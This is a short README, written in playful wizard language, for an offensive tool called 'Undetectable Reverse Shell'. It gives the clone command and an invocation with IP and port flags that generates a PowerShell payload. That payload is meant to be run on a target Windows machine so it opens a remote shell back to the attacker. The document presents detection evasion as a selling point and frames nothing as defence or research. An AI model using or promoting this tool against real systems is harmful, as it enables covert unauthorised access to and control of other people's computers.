## Getting Started

To master this spell, follow these simple guidelines.

### Requirements

- A cauldron with Python 3.x brew
- A key to the castle's server chamber (or a machine running the Windows operating system)

### Installation

1. Use a magical mirror to clone the repository
   ```
   git clone https://github.com/1603160/Undetectable-Reverse-Shell-1.0.git
   ```
2. Traverse to the script's secret chamber
   ```
   cd undetectable-reverse-shell
   ```

## Invocation

Invoke the Undetectable Reverse Shell by specifying the coordinates of the receiving castle's magical portal (IP address) and the secret passageway (port).

```python
python generador3.py --ip 192.168.1.2 --port 8080
```

This will conjure a PowerShell chant, which can be whispered into the ears of the target castle's gatekeeper to open the secret passageway.
